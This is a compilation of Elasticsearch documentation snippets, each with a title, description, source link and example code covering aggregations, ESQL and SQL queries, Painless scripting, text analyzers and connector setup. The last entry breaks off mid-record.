Configuring Date Histogram with Fixed Interval in Elasticsearch\nDESCRIPTION: This example shows how to configure a date histogram aggregation with a fixed interval of 30 days in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"sales_over_time\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"fixed_interval\": \"30d\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Including BUCKET Function Documentation in Markdown\nDESCRIPTION: This snippet includes documentation for the BUCKET function from an external markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/functions-operators/grouping-functions.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../_snippets/functions/layout/bucket.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Defining Synonyms Using Solr Format in Text\nDESCRIPTION: Defines groups of equivalent and explicit synonyms using the Solr format. These examples show how synonyms can be grouped using commas for equivalent words or expanded in explicit rules.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-synonym-graph-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nipod, i-pod, i pod\ncomputer, pc, laptop\n```\n\nLANGUAGE: text\nCODE:\n```\npersonal computer => pc\nsea biscuit, sea biscit => seabiscuit\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Type Mapping Table\nDESCRIPTION: A markdown table documenting the supported ESQL function types, showing query input types (keyword, text), parameter types (named parameters), and return types (boolean).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/qstr.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| query | options | result |\n| --- | --- | --- |\n| keyword | named parameters | boolean |\n| text | named parameters | boolean |\n```\n\n----------------------------------------\n\nTITLE: Downloading Sample Configuration File using cURL\nDESCRIPTION: Command to download the sample configuration file for Elasticsearch MongoDB connector deployment\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-mongodb.md#2025-04-21_snippet_4\n\nLANGUAGE: sh\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Indexing Documents with Multi-field Mapping in Elasticsearch\nDESCRIPTION: This snippet shows how to index two documents into the previously created index with multi-field mapping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/multi-fields.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1\n{\n  \"city\": \"New York\"\n}\n\nPUT my-index-000001/_doc/2\n{\n  \"city\": \"York\"\n}\n```\n\n----------------------------------------\n\nTITLE: Warning Assertions in CSV-SPEC Tests\nDESCRIPTION: Demonstrates how to assert warnings in CSV-SPEC tests using plain text and regular expression matching\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/esql/qa/testFixtures/src/main/resources/README.md#2025-04-21_snippet_4\n\nLANGUAGE: csv-spec\nCODE:\n```\naddLongOverflow\nrow max = 9223372036854775807 | eval sum = max + 1 | keep sum;\n\nwarning:Line 1:44: evaluation of [max + 1] failed, treating result as null. Only first 20 failures recorded.\nwarning:Line 1:44: java.lang.ArithmeticException: long overflow\n\nsum:long\nnull\n;\n```\n\n----------------------------------------\n\nTITLE: Displaying NOW Function Syntax in ESQL\nDESCRIPTION: This code snippet embeds an SVG image that illustrates the syntax of the NOW function in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/now.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{image} ../../../images/functions/now.svg\n:alt: Embedded\n:class: text-center\n:::\n```\n\n----------------------------------------\n\nTITLE: Using IN Operator in ESQL Query\nDESCRIPTION: This snippet demonstrates the usage of the IN operator in ESQL. It creates a row with values for 'a', 'b', and 'c', then uses the WHERE clause with the IN operator to filter based on whether 'c-a' is equal to any of the values in the provided list.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/in.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = 1, b = 4, c = 3\n| WHERE c-a IN (3, b / 2, a)\n```\n\n----------------------------------------\n\nTITLE: Invalid Calendar Interval Configuration in Elasticsearch\nDESCRIPTION: This example shows an invalid configuration of a date histogram aggregation using multiples of calendar units, which is not supported and results in an error.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"sales_over_time\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"2d\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Geo-bounding Box Query Using Geohash\nDESCRIPTION: This snippet queries for documents using geohashes in a geo_bounding_box filter. Inputs include appropriate geohash strings, and outputs comprise documents whose location falls within the bounding box. Geohashes must correspond to the geographic location data to be queried effectively.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-bounding-box-query.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nGET my_locations/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_bounding_box\": {\n          \"pin.location\": {\n            \"top_left\": \"dr5r9ydj2y73\",\n            \"bottom_right\": \"drj7teegpus6\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating CJK Custom Analyzer in Elasticsearch\nDESCRIPTION: This snippet illustrates how to set up a custom analyzer for CJK text in Elasticsearch. It includes the use of various filters like CJK width and bigram filters alongside an English stop words filter. Parameters like 'stopwords' provide customization for text processing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_7\n\nLANGUAGE: json\nCODE:\n```\nPUT /cjk_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"english_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  [ <1>\n            \"a\", \"and\", \"are\", \"as\", \"at\", \"be\", \"but\", \"by\", \"for\",\n            \"if\", \"in\", \"into\", \"is\", \"it\", \"no\", \"not\", \"of\", \"on\",\n            \"or\", \"s\", \"such\", \"t\", \"that\", \"the\", \"their\", \"then\",\n            \"there\", \"these\", \"they\", \"this\", \"to\", \"was\", \"will\",\n            \"with\", \"www\"\n          ]\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_cjk\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"cjk_width\",\n            \"lowercase\",\n            \"cjk_bigram\",\n            \"english_stop\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Recovery Bandwidth Settings\nDESCRIPTION: Configuration settings for controlling recovery bandwidth in Elasticsearch managed services. Includes settings for disk read/write speeds, network throughput, and bandwidth allocation factors.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/index-recovery-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nnode.bandwidth.recovery.disk.read: <byte_value>/s\nnode.bandwidth.recovery.disk.write: <byte_value>/s\nnode.bandwidth.recovery.network: <byte_value>/s\nnode.bandwidth.recovery.factor.read: <float>\nnode.bandwidth.recovery.factor.write: <float>\nnode.bandwidth.recovery.operator.factor.read: <float>\nnode.bandwidth.recovery.operator.factor.write: <float>\nnode.bandwidth.recovery.operator.factor: <float>\nnode.bandwidth.recovery.operator.factor.max_overcommit: <float>\n```\n\n----------------------------------------\n\nTITLE: Applying Apache License 2.0 Boilerplate Notice\nDESCRIPTION: This snippet provides a template for the boilerplate notice to be included when applying the Apache License 2.0 to a software project. It includes placeholders for the copyright year and owner, and specifies the location of the full license text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/lang-tag-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Plain Text\nCODE:\n```\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Removing mapper-murmur3 plugin from Elasticsearch\nDESCRIPTION: This command removes the mapper-murmur3 plugin from Elasticsearch. The node must be stopped before removing the plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-murmur3.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin remove mapper-murmur3\n```\n\n----------------------------------------\n\nTITLE: MeCab Korean Dictionary Download URL\nDESCRIPTION: Direct download link for the MeCab Korean dictionary package version 2.0.3 from BitBucket, dated September 22, 2017. The package is distributed as a tar.gz archive.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-nori/licenses/lucene-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nhttps://bitbucket.org/eunjeon/mecab-ko-dic/downloads/mecab-ko-dic-2.0.3-20170922.tar.gz\n```\n\n----------------------------------------\n\nTITLE: Initialize Museums Index with Point Data\nDESCRIPTION: Creates an Elasticsearch index for museums with a point field and populates it with sample location data for various museums.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-cartesian-centroid-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /museums\n{\n  \"mappings\": {\n    \"properties\": {\n      \"location\": {\n        \"type\": \"point\"\n      }\n    }\n  }\n}\n\nPOST /museums/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"location\": \"POINT (491.2350 5237.4081)\", \"city\": \"Amsterdam\", \"name\": \"NEMO Science Museum\"}\n{\"index\":{\"_id\":2}}\n{\"location\": \"POINT (490.1618 5236.9219)\", \"city\": \"Amsterdam\", \"name\": \"Museum Het Rembrandthuis\"}\n{\"index\":{\"_id\":3}}\n{\"location\": \"POINT (491.4722 5237.1667)\", \"city\": \"Amsterdam\", \"name\": \"Nederlands Scheepvaartmuseum\"}\n{\"index\":{\"_id\":4}}\n{\"location\": \"POINT (440.5200 5122.2900)\", \"city\": \"Antwerp\", \"name\": \"Letterenhuis\"}\n{\"index\":{\"_id\":5}}\n{\"location\": \"POINT (233.6389 4886.1111)\", \"city\": \"Paris\", \"name\": \"Musée du Louvre\"}\n{\"index\":{\"_id\":6}}\n{\"location\": \"POINT (232.7000 4886.0000)\", \"city\": \"Paris\", \"name\": \"Musée d'Orsay\"}\n```\n\n----------------------------------------\n\nTITLE: Creating Index Mapping and Indexing Documents for RRF Example in Elasticsearch\nDESCRIPTION: Sets up an Elasticsearch index with text, vector, and integer fields, then indexes five documents with various values to demonstrate Reciprocal Rank Fusion (RRF).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT example-index\n{\n    \"mappings\": {\n        \"properties\": {\n            \"text\" : {\n                \"type\" : \"text\"\n            },\n            \"vector\": {\n                \"type\": \"dense_vector\",\n                \"dims\": 1,\n                \"index\": true,\n                \"similarity\": \"l2_norm\",\n                 \"index_options\": {\n                     \"type\": \"hnsw\"\n                 }\n            },\n            \"integer\" : {\n                \"type\" : \"integer\"\n            }\n        }\n    }\n}\n\nPUT example-index/_doc/1\n{\n    \"text\" : \"rrf\",\n    \"vector\" : [5],\n    \"integer\": 1\n}\n\nPUT example-index/_doc/2\n{\n    \"text\" : \"rrf rrf\",\n    \"vector\" : [4],\n    \"integer\": 2\n}\n\nPUT example-index/_doc/3\n{\n    \"text\" : \"rrf rrf rrf\",\n    \"vector\" : [3],\n    \"integer\": 1\n}\n\nPUT example-index/_doc/4\n{\n    \"text\" : \"rrf rrf rrf rrf\",\n    \"integer\": 2\n}\n\nPUT example-index/_doc/5\n{\n    \"vector\" : [0],\n    \"integer\": 1\n}\n\nPOST example-index/_refresh\n```\n\n----------------------------------------\n\nTITLE: Indexing and Querying Documents with Annotations in Elasticsearch\nDESCRIPTION: This example demonstrates how to index a document with annotated text and structured fields, then query it with aggregations. The query searches for elastic stack components while the significant_terms aggregation identifies people associated with those components.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-annotated-text-tips.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\n# Example documents\nPUT my-index-000001/_doc/1\n{\n  \"my_unstructured_text_field\": \"[Shay](%40kimchy) created elasticsearch\",\n  \"my_twitter_handles\": [\"@kimchy\"] <1>\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"query_string\": {\n        \"query\": \"elasticsearch OR logstash OR kibana\",<2>\n        \"default_field\": \"my_unstructured_text_field\"\n    }\n  },\n  \"aggregations\": {\n  \t\"top_people\" :{\n  \t    \"significant_terms\" : { <3>\n\t       \"field\" : \"my_twitter_handles.keyword\"\n  \t    }\n  \t}\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Histogram Aggregation with Minimum Document Count\nDESCRIPTION: Example showing how to configure histogram aggregation with a minimum document count to filter out empty buckets. Only buckets with at least the specified number of documents will be included in the response.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-histogram-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"prices\": {\n      \"histogram\": {\n        \"field\": \"price\",\n        \"interval\": 50,\n        \"min_doc_count\": 1\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"prices\": {\n      \"buckets\": [\n        {\n          \"key\": 0.0,\n          \"doc_count\": 1\n        },\n        {\n          \"key\": 50.0,\n          \"doc_count\": 1\n        },\n        {\n          \"key\": 150.0,\n          \"doc_count\": 2\n        },\n        {\n          \"key\": 200.0,\n          \"doc_count\": 3\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Removing Store SMB Plugin from Elasticsearch\nDESCRIPTION: Command to remove the Store SMB plugin from Elasticsearch. The node must be stopped before removing the plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/store-smb.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin remove store-smb\n```\n\n----------------------------------------\n\nTITLE: Using SCORE with Alternative Sorting in Elasticsearch SQL\nDESCRIPTION: Example showing how to display relevance scores while sorting by a different field (release date) to gain insights into both relevance and chronology.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-search.md#2025-04-21_snippet_10\n\nLANGUAGE: sql\nCODE:\n```\nSELECT SCORE() AS score, name, release_date FROM library WHERE QUERY('dune') ORDER BY YEAR(release_date) DESC;\n\n     score     |       name        |    release_date\n---------------+-------------------+--------------------\n1.4005898      |God Emperor of Dune|1981-05-28T00:00:00Z\n1.6086556      |Children of Dune   |1976-04-21T00:00:00Z\n1.8893257      |Dune Messiah       |1969-10-15T00:00:00Z\n2.2886353      |Dune               |1965-06-01T00:00:00Z\n```\n\n----------------------------------------\n\nTITLE: Querying No Documents with match_none in Elasticsearch\nDESCRIPTION: This snippet shows how to perform a match_none query in Elasticsearch, which will match no documents. This is useful for testing and validation within query logic.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-match-all-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match_none\": {}\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using LongGaugeMetric Utility in Elasticsearch\nDESCRIPTION: This example demonstrates the use of the LongGaugeMetric utility to simplify the registration and updating of a LongGauge.  It's useful when direct access to the 'state' to be fetched on metric event is unavailable. The `create()` method is used to register the gauge, and the `set()` method is used to update the gauge's value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/METERING.md#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nMeterRegistry meterRegistry ;\nLongGaugeMetric longGaugeMetric = LongGaugeMetric.create(meterRegistry, \"es.test.gauge\", \"a test gauge\", \"total value\");\nlongGaugeMetric.set(123L);\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types Table in Markdown\nDESCRIPTION: A markdown table showing the mapping of various input field types to their corresponding result type (unsigned_long) for an ESQL function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/to_unsigned_long.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| boolean | unsigned_long |\n| date | unsigned_long |\n| double | unsigned_long |\n| integer | unsigned_long |\n| keyword | unsigned_long |\n| long | unsigned_long |\n| text | unsigned_long |\n| unsigned_long | unsigned_long |\n```\n\n----------------------------------------\n\nTITLE: Indexing All Pages - JSON Snippet - JavaScript\nDESCRIPTION: This JSON snippet illustrates how to index all pages in the Notion workspace. It can be useful for full-scale synchronization without applying specific title filters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-notion.md#2025-04-21_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"searches\": [\n    {\n      \"filter\": {\n        \"value\": \"page\"\n      },\n      \"query\": \"\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with CJK Width Filter\nDESCRIPTION: Example of creating a custom analyzer that incorporates the CJK width token filter using the create index API. The analyzer uses the standard tokenizer followed by the CJK width filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-cjk-width-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /cjk_width_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"standard_cjk_width\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"cjk_width\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running Oracle Connector Docker Image\nDESCRIPTION: This snippet demonstrates how to run the Docker image for the Oracle connector, including volume mounting and network configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-oracle.md#2025-04-21_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Elvis Operator in Painless\nDESCRIPTION: Explains the elvis operator in Painless, used as a shortcut for the conditional operator to handle null checks succinctly. It ensures non-null results by evaluating two expressions and is vital in nullable type operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_20\n\nLANGUAGE: painless\nCODE:\n```\nList x = new ArrayList();\nList y = x ?: new ArrayList();\ny = null;\nList z = y ?: new ArrayList();\n```\n\n----------------------------------------\n\nTITLE: Setting Allowed Inline Metric Scripts\nDESCRIPTION: Dynamic setting that specifies list of allowed inline scripts for scripted metrics aggregations. Empty by default.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/search-settings.md#2025-04-21_snippet_3\n\nLANGUAGE: properties\nCODE:\n```\nsearch.aggs.allowed_inline_metric_scripts\n```\n\n----------------------------------------\n\nTITLE: NestedDocument Class for Nested Document Handling\nDESCRIPTION: This snippet describes the org.elasticsearch.script.field.NestedDocument class that facilitates operations on nested documents within Elasticsearch. It includes methods for accessing fields, checking existence, and managing the size of nested documents, ensuring nested document structures can be adequately handled in scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.reindex.txt#2025-04-21_snippet_5\n\nLANGUAGE: groovy\nCODE:\n```\nclass org.elasticsearch.script.field.NestedDocument {\n    WriteField field(String)\n    Stream fields(String)\n    boolean isEmpty()\n    int size()\n    boolean exists()\n    void remove()\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Watcher with Payload Transformation\nDESCRIPTION: This example demonstrates how to execute a watch with a transform script to modify the payload. The transform script uses the Java Stream API to filter and map the data, and then collects the results into a list for both 'money_makers' and 'duds'. This example shows the basic setup to use a transform script at the top level of the watch definition.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-watcher-transform-context.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _watcher/watch/_execute\n{\n  \"watch\" : {\n    \"trigger\" : { \"schedule\" : { \"interval\" : \"24h\" } },\n    \"input\" : {\n      \"search\" : {\n        \"request\" : {\n          \"indices\" : [ \"seats\" ],\n          \"body\" : {\n            \"query\" : { \"term\": { \"sold\": \"true\"} },\n            \"aggs\" : {\n              \"theatres\" : {\n                \"terms\" : { \"field\" : \"play\" },\n                \"aggs\" : {\n                  \"money\" : {\n                    \"sum\": { \"field\" : \"cost\" }\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    },\n    \"transform\" : {\n      \"script\":\n      \"\"\"\n        return [\n          'money_makers': ctx.payload.aggregations.theatres.buckets.stream()  <1>\n            .filter(t -> {                                                    <2>\n                return t.money.value > 50000\n            })\n            .map(t -> {                                                       <3>\n                return ['play': t.key, 'total_value': t.money.value ]\n            }).collect(Collectors.toList()),                                  <4>\n          'duds' : ctx.payload.aggregations.theatres.buckets.stream()         <5>\n            .filter(t -> {\n                return t.money.value < 15000\n            })\n            .map(t -> {\n                return ['play': t.key, 'total_value': t.money.value ]\n            }).collect(Collectors.toList())\n          ]\n      \"\"\"\n    },\n    \"actions\" : {\n      \"my_log\" : {\n        \"logging\" : {\n          \"text\" : \"The output of the payload was transformed to {{ctx.payload}}\"\n        }\n      }\n    }\n  }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Boolean Type Equality Not Equals Examples\nDESCRIPTION: Demonstrates equality not equals operations with boolean values, showing comparisons between true and false values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_17\n\nLANGUAGE: painless\nCODE:\n```\nboolean a = true;\nboolean b = false;\na = a != false;\nb = a != b;\n```\n\n----------------------------------------\n\nTITLE: Phrase Suggester with Collate Query in Elasticsearch\nDESCRIPTION: This example demonstrates using the phrase suggester with a collate query to prune suggestions based on document matches, including templating and custom parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST test/_search\n{\n  \"suggest\": {\n    \"text\" : \"noble prize\",\n    \"simple_phrase\" : {\n      \"phrase\" : {\n        \"field\" :  \"title.trigram\",\n        \"size\" :   1,\n        \"direct_generator\" : [ {\n          \"field\" :            \"title.trigram\",\n          \"suggest_mode\" :     \"always\",\n          \"min_word_length\" :  1\n        } ],\n        \"collate\": {\n          \"query\": {\n            \"source\" : {\n              \"match\": {\n                \"{{field_name}}\" : \"{{suggestion}}\"\n              }\n            }\n          },\n          \"params\": {\"field_name\" : \"title\"},\n          \"prune\": true\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Comparing String Length and Byte Length in ESQL\nDESCRIPTION: This ESQL query demonstrates the usage of BYTE_LENGTH function in comparison with LENGTH function. It selects cities in India from the airports dataset, keeping only the city column, and then calculates both the character length and byte length of each city name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/byte_length.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airports\n| WHERE country == \"India\"\n| KEEP city\n| EVAL fn_length = LENGTH(city), fn_byte_length = BYTE_LENGTH(city)\n```\n\n----------------------------------------\n\nTITLE: Using ABS Function in Elasticsearch SQL\nDESCRIPTION: Returns the absolute value of a numeric expression. The function takes a numeric input and returns a value of the same type. If null is provided, the function returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nABS(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Numeric Literal Examples in Elasticsearch SQL\nDESCRIPTION: Demonstrates various formats of numeric literals in Elasticsearch SQL, including integer notation, decimal notation, and scientific notation with exponents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-lexical-structure.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\n1969    -- integer notation\n3.14    -- decimal notation\n.1234   -- decimal notation starting with decimal point\n4E5     -- scientific notation (with exponent marker)\n1.2e-3  -- scientific notation with decimal point\n```\n\n----------------------------------------\n\nTITLE: List Initialization Examples in Painless\nDESCRIPTION: Demonstrates various list initialization scenarios including empty lists and lists with static/non-static values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_7\n\nLANGUAGE: painless\nCODE:\n```\nList empty = [];\nList list = [1, 2, 3];\nint i = 1;\nlong l = 2L;\nfloat f = 3.0F;\ndouble d = 4.0;\nString s = \"5\";\nList list = [i, l, f*d, s];\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice Template\nDESCRIPTION: Standard copyright and license notice template to be included in source files. The [yyyy] and [name of copyright owner] placeholders should be replaced with actual values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-url/licenses/commons-logging-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Running Bulk Indexing Benchmark with Gradle\nDESCRIPTION: Gradle command to execute a bulk indexing benchmark on Elasticsearch. It specifies client type, benchmark type, target host, data file, index name, type name, document count, and bulk size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/client/benchmark/README.md#2025-04-21_snippet_2\n\nLANGUAGE: gradle\nCODE:\n```\ngradlew -p client/benchmark run --args ' rest bulk localhost build/documents-2.json geonames type 8647880 5000'\n```\n\n----------------------------------------\n\nTITLE: Division Operator in Elasticsearch SQL\nDESCRIPTION: Shows how to perform division (/) between two numeric values\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators-math.md#2025-04-21_snippet_4\n\nLANGUAGE: sql\nCODE:\n```\nSELECT 6 / 3 AS x;\n```\n\n----------------------------------------\n\nTITLE: Fetching Standard Objects via SOQL and SOSL\nDESCRIPTION: This snippet shows how to fetch documents for standard objects using both SOQL and SOSL queries. It demonstrates the input format for queries and specifies the expected return type as an array of documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-salesforce.md#2025-04-21_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\n[\n  {\n    \"query\": \"SELECT Account_Id, Address, Contact_Number FROM Account\",\n    \"language\": \"SOQL\"\n  },\n  {\n    \"query\": \"FIND {Alex Wilber} IN ALL FIELDS RETURNING Contact(LastModifiedDate, Name, Address)\",\n    \"language\": \"SOSL\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Point Parameter Documentation in Markdown\nDESCRIPTION: Documentation block describing a point parameter that accepts geo_point or cartesian_point type expressions, with null handling behavior.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/st_y.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`point`\n:   Expression of type `geo_point` or `cartesian_point`. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Downloading Zoom Connector Sample Configuration File with curl\nDESCRIPTION: Command to download the sample configuration file for the connector from the GitHub repository.\nSOURCE: 